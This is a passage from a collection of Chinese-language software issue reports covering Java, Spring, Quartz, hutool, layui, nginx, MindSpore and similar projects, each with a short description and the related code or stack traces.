org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:576) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:273) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1237) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1164) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:593) ... 24 common frames omitted Caused by: org.quartz.JobPersistenceException: Couldn't obtain triggers for job: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ? at org.quartz.impl.jdbcjobstore.JobStoreSupport.getTriggersForJob(JobStoreSupport.java:2190) at org.quartz.impl.jdbcjobstore.JobStoreSupport$29.execute(JobStoreSupport.java:2176) at org.quartz.impl.jdbcjobstore.JobStoreCMT.executeInLock(JobStoreCMT.java:245) at org.quartz.impl.jdbcjobstore.JobStoreSupport.executeWithoutLock(JobStoreSupport.java:3785) at org.quartz.impl.jdbcjobstore.JobStoreSupport.getTriggersForJob(JobStoreSupport.java:2173) at org.quartz.core.QuartzScheduler.getTriggersOfJob(QuartzScheduler.java:1445) at org.quartz.core.QuartzScheduler.deleteJob(QuartzScheduler.java:958) at org.quartz.impl.StdScheduler.deleteJob(StdScheduler.java:301) at com.ruoyi.quartz.service.impl.SysJobServiceImpl.updateSchedulerJob(SysJobServiceImpl.java:240) at com.ruoyi.quartz.service.impl.SysJobServiceImpl.init(SysJobServiceImpl.java:45) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:363) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:307) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:136) ... 36 common frames omitted Caused by: java.lang.IllegalStateException: No record found for selection of Trigger with key: 'DEFAULT.TASK_CLASS_NAME3' and statement: SELECT * FROM QRTZ_CRON_TRIGGERS WHERE SCHED_NAME = 'RuoyiScheduler' AND TRIGGER_NAME = ? AND TRIGGER_GROUP = ? at org.quartz.impl.jdbcjobstore.CronTriggerPersistenceDelegate.loadExtendedTriggerProperties(CronTriggerPersistenceDelegate.java:107) at org.quartz.impl.jdbcjobstore.StdJDBCDelegate.selectTrigger(StdJDBCDelegate.java:1819) at org.quartz.impl.jdbcjobstore.StdJDBCDelegate.selectTriggersForJob(StdJDBCDelegate.java:1704) at org.quartz.impl.jdbcjobstore.JobStoreSupport.getTriggersForJob(JobStoreSupport.java:2187) ... 52 common frames omitted 这个是报错信息，启动项目就定时任务出错，然后我把pom里的定时任务给注掉就好用了，请问能有什么办法解决吗！！！   <code>: ---'\____ // // .' \\| |// - . .' /--.--\ .___\_&lt;|&gt;_/___.' &gt;'"""". // // | | : \ _ / / - -. \_ __\ /__ _/ .- -.____ ____.-'======== // //"
怎么区分2028年五月初五和闰五月初五呢？一般只过一个端午节啊,"JDK版本： jdk1.8.0_192 hutool版本： 5.7.17   <code>: public static void main(String[] args) { LocalDateTime with1 = LocalDate.of(2028, 5, 28).atTime(LocalTime.MIN); LocalDateTime with2 = LocalDate.of(2028, 6, 27).atTime(LocalTime.MIN); ChineseDate chineseDate1 = new ChineseDate(Date.from(with1.toInstant(ZoneOffset.ofHours(8)))); ChineseDate chineseDate2 = new ChineseDate(Date.from(with2.toInstant(ZoneOffset.ofHours(8)))); System.out.println(chineseDate1); //戊申猴年 闰五月初五 System.out.println(chineseDate2); //戊申猴年 闰五月初五 } 按照传统，一般是不会过第二个端午节的，国家也不会放假；现在我能想到的解决办法就是当前日期减去一个月然后再取月份，如果相同的那么现在就是第二个五月，就不用过这个端午节。请问有什么更加简单的方法把这两个五月区分开来吗？"
手机端 无法播放视频 ,"最后发现是这个函数抛出异常 protected void sendFileToWebPage(String localParentPath, String file_name, ReturnAjax rt,HttpServletResponse response,HttpServletRequest request) throws Exception{ out.write(buffer, 0, len);   <code>: String dstPath = localParentPath + file_name; //检查文件是否存在 File file = new File(dstPath); if(!file.exists()) { docSysErrorLog(""文件 ""+ dstPath + "" 不存在！"", rt); writeJson(rt, response); return; } System.out.println(""sendFileToWebPage() file_name befor convert:"" + file_name); //解决中文编码问题 String userAgent = request.getHeader(""User-Agent"").toUpperCase(); if(userAgent.indexOf(""MSIE"")&gt;0 || userAgent.indexOf(""LIKE GECKO"")&gt;0) //LIKE GECKO is for IE10 { file_name = URLEncoder.encode(file_name, ""UTF-8""); System.out.println(""sendFileToWebPage() file_name after URL Encode:"" + file_name); }else{ file_name = new String(file_name.getBytes(""UTF-8""),""ISO8859-1""); System.out.println(""sendFileToWebPage() file_name after convert to ISO8859-1:"" + file_name); } //解决空格问题（空格变加号和兼容性问题） file_name = file_name.replaceAll(""\\+"", ""%20"").replaceAll(""%28"", ""\\("").replaceAll(""%29"", ""\\)"").replaceAll(""%3B"", "";"").replaceAll(""%40"", ""@"").replaceAll(""%23"", ""\\#"").replaceAll(""%26"", ""\\&amp;""); System.out.println(""sendFileToWebPage() file_name:"" + file_name); response.setHeader(""content-disposition"", ""attachment;filename=\"""" + file_name +""\""""); //读取要下载的文件，保存到文件输入流 FileInputStream in = null; //创建输出流 OutputStream out = null; try { //读取要下载的文件，保存到文件输入流 in = new FileInputStream(dstPath); //创建输出流 out = response.getOutputStream(); //创建缓冲区 byte buffer[] = new byte[1024]; int len = 0; //循环将输入流中的内容读取到缓冲区当中 while((len=in.read(buffer))&gt;0){ //输出缓冲区的内容到浏览器，实现文件下载 } in.close(); in = null; out.close(); out = null; }catch (Exception e) { if(in != null) { in.close(); } if(out != null) { out.close(); } e.printStackTrace(); System.out.println(""sendFileToWebPage() Exception""); } }"
Fix tensorrt subgraph bug.,"Suppose we have a graph G. The G can be describe as follows: . There are 4 nodes in the graph. We suppose that can be convert to tensorrt nodes. According to the algo we support now, A, B, C will be merged into a subgraph SubG. So, the result graph will be, there will be a cycle here. To prevent the occurrence of the above situation, we must guarantee that if node x and node y in the subgraph then all path from x and y are in the subgraph.   <code>: A -&gt; B -&gt; C, A -&gt; D -&gt; C A, B, C SubG -&gt; D, D-&gt; SubG"
Unify `data_type` and `dtype`,"In Python API, we are using both and . They are totally the same mean. As numpy is using , I think we shall change all to .   <code>: data_type dtype dtype data_type dtype"
网络工具判断内网报错,"JDK版本： openjdk_8_202 hutool版本： 5.7.16 网络工具查询是否为内网ip,如果传入的是ipv6会直接报错,看了源码是直接转换的ipv4 该工具如果是网络工具,是否应该支持ipv6,如果暂不支持,能否麻烦作者提供一个可替代的方案呢 堆栈信息 <ol start=""3"">   <code>: NetUtil.isInnerIP(""ipv6""); java.lang.IllegalArgumentException: Invalid IPv4 address! at cn.hutool.core.net.Ipv4Util.ipv4ToLong(Ipv4Util.java:166) at cn.hutool.core.net.NetUtil.ipv4ToLong(NetUtil.java:83) at cn.hutool.core.net.NetUtil.isInnerIP(NetUtil.java:241)"
layer-vue 无法和bootstrap 5.x 兼容,"单独使用 layer， 代码如下： 弹出框发生错位，不使用 bootstrap 就没问题。有办法改进吗，毕竟在网页前端（不是中台），bootstrap还是广泛使用的。没法兼容的话，bootstrap就没法使用layer弹窗了。 个人建议而已，不是很重要的问题，希望 layer 能兼容其他框架。   <code>: import 'bootstrap/dist/css/bootstrap.min.css'; import bootstrap from 'bootstrap/dist/js/bootstrap' import layer from '@layui/layer-vue'; import '@layui/layer-vue/lib/index.css'; layer.confirm('确定要保存以下路径吗？&lt;br /&gt;' + this.projectConfig.path, { area:['400px','200px'], isHtmlFragment: true, btn: [ { text: '取消', callback: function (id) { layer.close(id); } }, { text: '确定', callback: function (id) { layer.close(id); } }, ] })"
关于登录背景图占满整个屏幕的建议,我自己更换了图片后，使用的原有的代码，图片出现重复   <code>: /**占满屏幕**/ .page-fill{width:100%;height:100%;display:block;box-sizing:border-box} /**占满屏幕**/ .page-fill { background-size: 100% 100%; height: 100%; position: fixed; width: 100%; }
layedit问题,"版本：2.5.6 描述：不知道是日语原因还是客户自己在网上复制粘贴的文案，现在就是富文本编辑器里的内容因为不能渲染（没有报错）导致整个table列表都不渲染，不知道问题在哪... ps:虽然layedit弃用了 我还在用... 在此处填写与问题对应的业务代码（可选） 把图下圈起来的地方去掉列表就展示了...说明富文本内容渲染出现了问题，麻烦大佬看看   <code>: { field: ""title"", title: ""标题"", minWidth: 500,templet: function (d) { var html = ''; html += `&lt;div class=""longTextDiv"" style=""color:#0a74E2;""&gt;&lt;span&gt;标题：&lt;/span&gt;${d.title !== '' ? d.title : '-'}&lt;/div&gt;`; html += `&lt;div class=""longTextDiv""&gt; &lt;span class=""cSpan""&gt;内容：&lt;span class=""cVal"" title=""${d.content}""&gt;${d.content !== '' ? d.content : '-'}&lt;/span&gt;&lt;/span&gt; &lt;/div&gt;`; html += `&lt;div class='lookMore shows' onclick=""lookMore(this)""&gt;查看更多&lt;/div&gt;`; html += `&lt;div class='lookMore hides' onclick=""closeMore(this)"" style=""display:none;""&gt;收起&lt;/div&gt;`; return html }, },"
"导入SQL失败,请检查{$Dir}.sql的语句是否正确","后台安装模块时提示： 环境 Win10 PHP7.4 运行于   <code>: 导入SQL失败,请检查{$Dir}.sql的语句是否正确 php think run"
关于cron4j使用注解创建的问题,"这段代码无论在什么情况下都会进入else分支，因为取到的类永远都是期待的类(接口)的子类(实现类)，从而相等比较永远为false,因此通过注解配置cron4j无法正常工作。 改为使用isAssignableFrom判断类型就可以正常工作:   <code>: for (Class clazz : list) { Cron4jTask cron4jTask = (Cron4jTask) clazz.getAnnotation(Cron4jTask.class); if (Runnable.class.isAssignableFrom(clazz)) { cron4jPlugin.addTask(cron4jTask.cron(), (Runnable) ClassNewer.newInstance(clazz), cron4jTask.daemon()); } else if (ProcessTask.class.isAssignableFrom(clazz)) { cron4jPlugin.addTask(cron4jTask.cron(), (ProcessTask) ClassNewer.newInstance(clazz), cron4jTask.daemon()); } else if (Task.class.isAssignableFrom(clazz)) { cron4jPlugin.addTask(cron4jTask.cron(), (Task) ClassNewer.newInstance(clazz), cron4jTask.daemon()); } else { throw new JbootException(""annotation Cron4jTask can not use for class : "" + clazz); } }"
"[ST][MS][NET][ctpn][910 8p]FromNpArray]Please check input data, the data of numpy array is empty","ctpn网络在910环境8p训练，训练日志有error日志 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:d24864dd -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220415 (/): /mode graph test_ms_ctpn_check_loss_8p_0001.py test_ms_ssd_mobilenetv1_fpn_coco2017_train_check_fps_gpu_002.py get code from models sh run_distribute_train_ascend.sh 网络训练成功，性能精度达标，训练日志正常 走给洛阳   <code>: [ERROR] MD(123549,fffe1dffb1e0,python):2022-05-12-05:41:54.466.045 [mindspore/ccsrc/minddata/dataset/core/data_type.cc:162] FromNpArray] Please check input data, the data of numpy array is empty. [ERROR] MD(123549,fffe1dffb1e0,python):2022-05-12-05:41:54.472.592 [mindspore/ccsrc/minddata/dataset/core/data_type.cc:168] FromNpArray] Cannot convert from numpy type. Unknown data type is returned! Currently supported data type: [int8, uint8, int16, uint16, int32, uint32, int64, uint64, float16, float32, float64, string] [ERROR] MD(123549,fffe1dffb1e0,python):2022-05-12-05:41:54.472.812 [mindspore/ccsrc/minddata/dataset/core/data_type.cc:162] FromNpArray] Please check input data, the data of numpy array is empty. [ERROR] MD(123549,fffe1dffb1e0,python):2022-05-12-05:41:54.472.833 [mindspore/ccsrc/minddata/dataset/core/data_type.cc:168] FromNpArray] Cannot convert from numpy type. Unknown data type is returned! Currently supported data type: [int8, uint8, int16, uint16, int32, uint32, int64, uint64, float16, float32, float64, string] [ERROR] MD(123549,fffe1dffb1e0,python):2022-05-12-05:41:54.473.785 [mindspore/ccsrc/minddata/dataset/util/task_manager.cc:217] InterruptMaster] Task is terminated with err msg(more detail in info level log):Unexpected error. map operation: [PyFunc] failed. The corresponding data files: /home/workspace/mindspore_dataset//ICDAR-SCUT-FORU-CocoText-SVT/ctpn_final_dataset/pretrain/ctpn_pretrain.mindrecord0. Invalid data type. Line of code : 96 File : /home/jenkins/agent-working-dir/workspace/Compile_Ascend_ARM_CentOS/mindspore/mindspore/ccsrc/minddata/dataset/core/tensor.cc [TRACE] TDT(123549,python):2022-05-12-05:42:05.606.212 [status:Running] [log.cpp:154]Channel ""2d74afbc-d173-11ec-8d6f-4cf55bcfc84a"": Send Sample Files,[tensor_data_deliver.cpp:279:Send]148603"
两个vue项目共用一个域名：Uncaught SyntaxError: Unexpected token '<',"环境信息 pigx版本: 3.8 是否修改包名: 是 两个vue项目共用一个域名，nginx配置如下： 目录/home/jclazz/task-ui/www下量vue项目：web，manager，web项目为自建项目非pigx项目。 访问 http://域名 能正常访问/home/jclazz/task-ui/www/web下的项目(非pigx项目)， 访问 http://域名/manager 报如下异常： 如果直接web项目的配置替换为pigx项目如下： 同样报如下异常：   <code>: server { listen 80; server_name localhost; location /{ root /home/jclazz/task-ui/www/web; index index.html; try_files $uri $uri/ /web/index.html; } location /manager { root /home/jclazz/task-ui/www; try_files $uri $uri/ /manager/index.html; } error_page 404 /40x.html; location = /40x.html { root html; } error_page 500 503 504 /50x.html; location = /50x.html { root html; } gzip on; gzip_static on; gzip_min_length 1k; gzip_comp_level 4; gzip_proxied any; gzip_types text/plain text/xml text/css; gzip_vary on; gzip_disable ""MSIE [1-6]\.(?!.*SV1)""; location ~* ^/(code|auth|admin|gen|daemon|tx|act|monitor|mp|job|pay) { proxy_pass http://127.0.0.1:9999; #proxy_set_header Host $http_host; proxy_connect_timeout 15s; proxy_send_timeout 15s; proxy_read_timeout 15s; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } Uncaught SyntaxError: Unexpected token '&lt;' location /{ root /home/jclazz/task-ui/www/manager; index index.html; try_files $uri $uri/ /manager/index.html; } Uncaught SyntaxError: Unexpected token '&lt;'"
CollUtil.containsAll方法的缺陷,"JDK版本： openjdk_8_201 hutool版本： 4.5.12 实际上list2应当认为完全包含在list1中, 但由于containsAll的逻辑, 实际返回的是 false. 以下为containsAll的源码   <code>: List&lt;String&gt; list1 = new ArrayList&lt;&gt;(); list1.add(""str""); List&lt;String&gt; list2 = new ArrayList&lt;&gt;(); boolean isContainsAll = CollUtil.containsAll(list1, list2); public static boolean containsAll(Collection&lt;?&gt; coll1, Collection&lt;?&gt; coll2) { if (isEmpty(coll1) || isEmpty(coll2) || coll1.size() &lt; coll2.size()) { return false; } for (Object object : coll2) { if (false == coll1.contains(object)) { return false; } } return true; }"
HttpRequestPart类SendAsync报错,"Furion 版本号 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp SendAsync出异常后，如果OnRequestFailded没有赋值，会出现空引用 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 先判断OnRequestFailded是否为空，再调用失败事件   <code>: try { if (RetryPolicy == null) response = await httpClient.SendAsync(request, cancellationToken); else { // 失败重试 await Retry.Invoke(async () =&gt; { // 发送请求 response = await httpClient.SendAsync(request, cancellationToken); }, RetryPolicy.Value.NumRetries, RetryPolicy.Value.RetryTimeout); } } catch (Exception ex) { // 触发自定义事件 if (response != null) OnRequestFailded(this, new HttpRequestFaildedEventArgs(request, response, ex)); exception = ex; } System.NullReferenceException:“Object reference not set to an instance of an object.”"
没有找到HTTPS的配置,"首先感谢作者及所有贡献者的开发，产品功能很完善，文档齐全，开箱即用。 根据微信官方说明，小程序上线时request url必须是https,我在代码中没有找到springboot配置https的地方，比如下面这些配置在哪？   <code>: server.ssl.key-store: classpath:www.demo.com.pfx server.ssl.key-store-password: 1234"
mixed precision training failed,"mixed precision training failed Hardware Environment(): /device ascend : -- MindSpore version : Mindspore of master -- Python version : 3.7.1 -- OS platform and distribution :Linux version 4.19.36-vhulk1907.1.0.h475.eulerosv2r8.aarch64 -- GCC/Compiler version : gcc version 7.3.0 (GCC) Reference script url: resnet50样例 I add several codes to the original script to transform the fully connected layer of resnet50 from fp32 to fp16. The changes are as follows. In resnet.py: The related error info: By the way, if the class num is small, the training process can run successfully.   <code>: platform linux -- Python 3.7.2, pytest-5.4.2, py-1.8.1, pluggy-0.13.1 -- /home/licheng/archiconda3/envs/mindspore/bin/python cachedir: .pytest_cache rootdir: /home/licheng/haiqwa-002/MindSpore_Perf/test/fp16/device0 collecting ... collected 1 item resnet50_distributed_training.py::test_train_cifar [WARNING] SESSION(58626,python):2020-05-30-12:33:27.103.386 [mindspore/ccsrc/session/ascend_session.cc:496] SelectKernel] There has 160 node/nodes used reduce precision to selected the kernel! [ERROR] KERNEL(58626,python):2020-05-30-12:36:22.635.530 [mindspore/ccsrc/kernel/tbe/tbe_kernel_parallel_build.cc:91] TbeOpParallelBuild] task compile Failed, task id:168, cause:TBEException:CompileProcessFailed: read built-in bank fail, disable rl rank! Traceback (most recent call last): File ""/home/licheng/code/ms_mas_0521/mindspore/build/package/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 120, in build_op return op_func(*inputs_args, *outputs_args, *attrs_args, kernel_name=kernel_name) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/topi/cce/util.py"", line 124, in in_wrapper return func(*args, **kwargs) File ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe/impl/bias_add_grad.py"", line 182, in bias_add_grad te.lang.cce.cce_build_code(sch, config) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/lang/cce/te_schedule/cce_schedule.py"", line 1289, in cce_build_code _build(sch, tensor_list, local_config_map[""name""]) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/lang/cce/te_schedule/cce_schedule.py"", line 1232, in _build tvm.build(sch, tensor_list, device, name=name) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/tvm/build_module.py"", line 760, in build binds=binds) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/tvm/build_module.py"", line 547, in lower return lower_cce(sch, stmt, name, binds, simple_mode, arg_list, cfg) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/tvm/build_module.py"", line 449, in lower_cce stmt = ir_pass.EmitInsn(stmt) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 209, in __call__ raise get_last_ffi_error() tvm._ffi.base.TVMError: Traceback (most recent call last): [bt] (8) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::ir::IRMutator::Mutate(tvm::Stmt)+0x6c) [0xffff06e1e38c] [bt] (7) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::NodeFunctor&lt;tvm::Stmt (tvm::runtime::ObjectRef const&amp;, tvm::Stmt const&amp;, tvm::ir::IRMutator*)&gt;::operator()(tvm::runtime::ObjectRef const&amp;, tvm::Stmt const&amp;, tvm::ir::IRMutator*) const+0x78) [0xffff06e1e200] [bt] (6) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x88b0c8) [0xffff06ee60c8] [bt] (5) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::ir::IRMutator::Mutate_(tvm::ir::ProducerConsumer const*, tvm::Stmt const&amp;)+0x6c) [0xffff06ee943c] [bt] (4) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::ir::IRMutator::Mutate(tvm::Stmt)+0x6c) [0xffff06e1e38c] [bt] (3) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(tvm::NodeFunctor&lt;tvm::Stmt (tvm::runtime::ObjectRef const&amp;, tvm::Stmt const&amp;, tvm::ir::IRMutator*)&gt;::operator()(tvm::runtime::ObjectRef const&amp;, tvm::Stmt const&amp;, tvm::ir::IRMutator*) const+0x78) [0xffff06e1e200] [bt] (2) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x88adf0) [0xffff06ee5df0] [bt] (1) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0x9d3138) [0xffff0702e138] [bt] (0) /usr/local/Ascend/fwkacllib/lib64/libtvm.so(+0xe5afc4) [0xffff074b5fc4] File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/tvm/_ffi/_ctypes/function.py"", line 74, in cfun rv = local_pyfunc(*pyargs) File ""/home/licheng/archiconda3/envs/mindspore/lib/python3.7/site-packages/te/platform/cce_intrin_md.py"", line 9470, in vector_dichotomy_add raise RuntimeError(""Dichotomy add not supported such emit_insn."") RuntimeError: Dichotomy add not supported such emit_insn."
1.5.17及之后的版本kotlin项目启动异常,Forest: 1.5.17及之后的版本 Backend: httpclient Language: kotlin 1.6 该问题是如何引起的？ 项目启动异常 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供）   <code>: Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'signatureClient': FactoryBean threw exception on object creation; nested exception is java.lang.StackOverflowError at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:176) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1884) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1284) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:267) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1605) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1562) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1343) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) ~[spring-beans-5.3.13.jar:5.3.13] at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ~[spring-beans-5.3.13.jar:5.3.13] ... 19 common frames omitted Caused by: java.lang.StackOverflowError: null at java.lang.String.&lt;init&gt;(String.java:207) ~[na:1.8.0_191] at java.lang.String.substring(String.java:1969) ~[na:1.8.0_191] at java.lang.Package.getPackage(Package.java:331) ~[na:1.8.0_191] at java.lang.Class.getPackage(Class.java:796) ~[na:1.8.0_191] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:302) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.17.jar:na]
不懂就问：为什么重写put方法？,"位于renren-common模块下的类io.renren.common.utils.R继承了HashMap，但是为什么要重写它的put方法呢？有什么玄机？   <code>: @Override public R put(String key, Object value) { super.put(key, value); return this; }"
【众智】【计算-TBE接入】Dilation2DBackpropFilter,计算相对于滤波器的形态二维膨胀梯度。 接口目录：mindspore/ops/operations/_grad_ops.py 对应底层算子 对应底层AI Core算子Dilation2DBackpropFilter stride int/tuple 属性 dilation int/tuple 属性 pad_mode str 属性 data_format str 属性 x filter out_backprop y 和TF接口不一致，多出pads和ceil_mode属性。 在注册文件中直接设置默认值。 标杆接口参考 TF接口：https://www.tensorflow.org/api_docs/python/tf/raw_ops/Dilation2DBackpropFilter 3. 异常处理 4. 算子反向 无反向   <code>: class Dilation2DBackpropFilter(Primitive):
关于返回封装类枚举值问题,"版本 返回封装类 问题 现在code字段是integer类型 msg是string类型的 但是使用中，多数都是用枚举，如果一个接口返回多个枚举值就不是很好显示了。 例如 一个登录接口伪代码如下 对应枚举值如下 但是在接口文档中，并体现不出来我其他枚举值的显示 代码如下：   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt; &lt;/dependency&gt; @Getter @Setter @ApiModel(value = ""R"", description = ""返回数据包装"") public class R&lt;T&gt; { @ApiModelProperty(value = ""响应状态码"", notes = ""成功1，失败0"") private Integer code; @ApiModelProperty(value = ""响应信息"") private String msg; @ApiModelProperty(value = ""响应对象"") private T data; public R() { } public R(ReturnCode returnCode, T data) { this.code = returnCode.getCode(); this.msg = returnCode.getMsg(); this.data = data; } public static &lt;T&gt; R&lt;T&gt; success() { return new R&lt;T&gt;(ReturnCode.SUCCESS, null); } public static &lt;T&gt; R&lt;T&gt; success(T object) { return new R&lt;T&gt;(ReturnCode.SUCCESS, object); } public static &lt;T&gt; R&lt;T&gt; success(ReturnCode returnCode, T object) { return new R&lt;T&gt;(returnCode, object); } public static &lt;T&gt; R&lt;T&gt; error() { return new R&lt;T&gt;(ReturnCode.ERROR, null); } public static &lt;T&gt; R&lt;T&gt; error(ReturnCode returnCode) { return new R&lt;T&gt;(returnCode, null); } public static &lt;T&gt; R&lt;T&gt; error(Integer code, String msg) { R&lt;T&gt; r = new R&lt;&gt;(); r.setCode(code); r.setMsg(msg); return r; } public static &lt;T&gt; R&lt;T&gt; error(ReturnCode returnCode, T object) { return new &lt;T&gt;R&lt;T&gt;(returnCode, object); } } public enum ReturnCode { SUCCESS(1, ""操作成功""), ERROR(0, ""操作失败""), // 校验公共错误 CHECK_ERROR(1000, ""校验公共错误""), // token错误 TOKEN_ERROR(2000, ""token错误""), ... } if (userInfo == null) { return R.error(ReturnCode.USER_PASSWORD_ERROR); } if (Constant.ONE.equals(userInfo.getUserStatus())) { return R.error(ReturnCode.USER_LOCKED_ERROR); } if (!BPwdEncoderUtil.matches(loginInputDTO.getPassword(), userInfo.getPassword().replace(""{bcrypt}"", """"))) { return R.error(ReturnCode.USER_PASSWORD_ERROR); } return success(tokenInfo.getTokenValue()); enum ReturnCode{ 